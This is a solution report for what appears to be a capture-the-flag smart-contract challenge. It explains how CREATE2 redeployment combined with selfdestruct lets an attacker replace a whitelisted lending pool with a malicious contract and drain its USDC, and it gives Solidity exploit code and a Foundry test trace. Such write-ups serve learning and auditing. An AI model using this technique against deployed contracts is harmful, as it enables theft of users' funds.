# Challenge 3: LendEx pool hack - Solution Report

## Problem Overview

### Contract Summary

The challenge involves several smart contracts:

1. LendingPool: The main contract that allows users to deposit and withdraw USDC tokens.

2. LendExGovernor: A governance contract that manages the LendingPool.

3. CreateDeployer: A contract that deploys either LendingPool or LendingHack contracts.

4. Create2Deployer: A contract that deploys CreateDeployer using the CREATE2 opcode.

5. USDC: A simple ERC20 token contract representing USDC stablecoin.

6. LendingHack: An attacker-controlled contract to replace the original LendingPool.

### Initial Setup

- USDC amount: 100,000
- Governance owner: Receives 100,000 USDC
- LendingPool: Deployed by the hacker
- LendExGovernor: Deployed by the governance owner
- LendingPool: Added to LendExGovernor's accepted contracts
- LendingPool: Funded with 100,000 USDC by LendExGovernor

### Success Criteria

To solve the challenge, the attacker must:

1. Change the LendingPool contract name from "LendingPool V1" to "LendingPool hack"
2. Steal all 100,000 USDC tokens from the LendingPool contract

## Vulnerability

The main vulnerability in this challenge lies in the deployment process and the ability to replace the LendingPool contract with a malicious one at the same address. There are two key aspects to this vulnerability:

1. Use of CREATE2 opcode:
   The Create2Deployer contract uses the CREATE2 opcode to deploy the CreateDeployer contract. This allows for deterministic address generation, which can be exploited to deploy contracts at predictable addresses.

   ```solidity
   function deploy() external returns (address) {
       bytes32 salt = keccak256(abi.encode(uint256(1)));
       return address(new CreateDeployer{salt: salt}(owner()));
   }
   ```

2. Presence of `selfdestruct` function:
   Both the LendingPool and CreateDeployer contracts have functions that allow them to be self-destructed:

   In LendingPool.sol:

   ```solidity
   function emergencyStop() public onlyOwner {
       selfdestruct(payable(0));
   }
   ```

   In CreateDeployer.sol:

   ```solidity
   function cleanUp() public onlyOwner {
       selfdestruct(payable(address(0)));
   }
   ```

The combination of these two factors allows an attacker to:

1. Deploy a contract at a specific address using CREATE2
2. Self-destruct the contract
3. Deploy a new, malicious contract at the same address

This vulnerability is particularly dangerous because the LendExGovernor contract maintains a whitelist of accepted contracts based on their addresses. By replacing the LendingPool contract with a malicious one at the same address, the attacker can bypass the governance checks and gain unauthorized access to the funds.

## Attack Process

The attack to exploit the vulnerability and steal the funds from the LendingPool consists of the following steps:

1. Self-destruct the CreateDeployer contract:

   - Call the `cleanUp()` function on the CreateDeployer contract.
   - This clears the contract's code from its address and resets its nonce.

2. Self-destruct the LendingPool contract:

   - Call the `emergencyStop()` function on the LendingPool contract.
   - This removes the original LendingPool contract's code, preparing the address for the malicious contract.

3. Re-deploy the CreateDeployer contract:

   - Use the Create2Deployer to deploy a new CreateDeployer contract.
   - Due to the deterministic nature of CREATE2 and the reset nonce, this new contract will have the same address as the original.

4. Deploy the malicious LendingHack contract:

   - Use the newly deployed CreateDeployer to deploy the LendingHack contract.
   - This malicious contract will be deployed at the same address as the original LendingPool.

5. Steal the funds:
   - Call the `stealFunds()` function on the LendingHack contract.
   - This function transfers all USDC tokens from the contract to the attacker's address.

The result of this attack process is:

- The LendingPool contract at the whitelisted address is replaced with the malicious LendingHack contract.
- The contract name is changed from "LendingPool V1" to "LendingPool hack".
- All USDC tokens (100,000) are transferred to the attacker's address.

This attack succeeds because the LendExGovernor contract continues to recognize the contract at the LendingPool's address as a valid, whitelisted contract, even though its implementation has been completely replaced.

## Proof of Concept (PoC)

### Core Implementation

The core implementation of the attack is split between the `setUp()` and `testExploit()` functions in the `Challenge3Test` contract, as well as the `LendingHack` contract. Here's the breakdown of the implementation:

1. In the `setUp()` function:

```solidity
// Selfdestruct CreateDeployer to clear its code thus reset nonce
createDeployer.cleanUp();

// Selfdestruct LendingPool to clear its code for HackPool to deploy
lendingPool.emergencyStop();
```

2. In the `testExploit()` function:

```solidity
// Re-deploy CreateDeployer to the same address
createDeployer = CreateDeployer(create2Deployer.deploy());

// Deploy LendingHack to the same address as the original LendingPool
LendingHack hackPool = LendingHack(createDeployer.deploy(false, address(usdc)));

// Verify it's the same address
assertEq(address(hackPool), address(lendingPool), "Hack pool should be at the same address as original pool");

// Steal the funds
hackPool.stealFunds(hacker);
```

3. In the `LendingHack` contract:

```solidity
contract LendingHack is Ownable {
    USDC public usdc;
    string public constant name = "LendingPool hack";

    constructor(address _owner, address _usdc) {
        _transferOwnership(_owner);
        usdc = USDC(_usdc);
    }

    // Function to steal all USDC from this contract
    function stealFunds(address _hacker) public onlyOwner {
        uint256 balance = usdc.balanceOf(address(this));
        usdc.transfer(_hacker, balance);
    }
}
```

This implementation successfully replaces the original LendingPool contract with the malicious LendingHack contract at the same address, changes the contract name, and allows the attacker to steal all the USDC tokens.

### Running Result

```
Ran 1 test for test/Challenge3.t.sol:Challenge3Test
[PASS] testExploit() (gas: 1297393)
Traces:
  [1302193] Challenge3Test::testExploit()
    ├─ [0] VM::startPrank(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE])
    │   └─ ← [Return]
    ├─ [938686] Create2Deployer::deploy()
    │   ├─ [902250] → new CreateDeployer@0x4A8E30F035d59E9844D519b2a8564e4743C8925f
    │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: Create2Deployer: [0x5020029b077577Aae04d569234b7fefA73e33784])
    │   │   ├─ emit OwnershipTransferred(previousOwner: Create2Deployer: [0x5020029b077577Aae04d569234b7fefA73e33784], newOwner: hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE])
    │   │   └─ ← [Return] 4378 bytes of code
    │   └─ ← [Return] CreateDeployer: [0x4A8E30F035d59E9844D519b2a8564e4743C8925f]
    ├─ [297145] CreateDeployer::deploy(false, USDC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [263907] → new LendingPool@0x1d9e4F37D66134fdfb6699FAb50342217707FeAe
    │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: CreateDeployer: [0x4A8E30F035d59E9844D519b2a8564e4743C8925f])
    │   │   ├─ emit OwnershipTransferred(previousOwner: CreateDeployer: [0x4A8E30F035d59E9844D519b2a8564e4743C8925f], newOwner: hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE])
    │   │   └─ ← [Return] 1078 bytes of code
    │   └─ ← [Return] LendingPool: [0x1d9e4F37D66134fdfb6699FAb50342217707FeAe]
    ├─ [34369] LendingPool::stealFunds(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE])
    │   ├─ [2562] USDC::balanceOf(LendingPool: [0x1d9e4F37D66134fdfb6699FAb50342217707FeAe]) [staticcall]
    │   │   └─ ← [Return] 100000 [1e5]
    │   ├─ [27838] USDC::transfer(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE], 100000 [1e5])
    │   │   ├─ emit Transfer(from: LendingPool: [0x1d9e4F37D66134fdfb6699FAb50342217707FeAe], to: hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE], value: 100000 [1e5])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [4094] LendExGovernor::getPoolName(LendingPool: [0x1d9e4F37D66134fdfb6699FAb50342217707FeAe]) [staticcall]
    │   ├─ [461] LendingPool::name() [staticcall]
    │   │   └─ ← [Return] "LendingPool hack"
    │   └─ ← [Return] "LendingPool hack"
    ├─ [562] USDC::balanceOf(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) [staticcall]
    │   └─ ← [Return] 100000 [1e5]
    └─ ← [Stop]
```
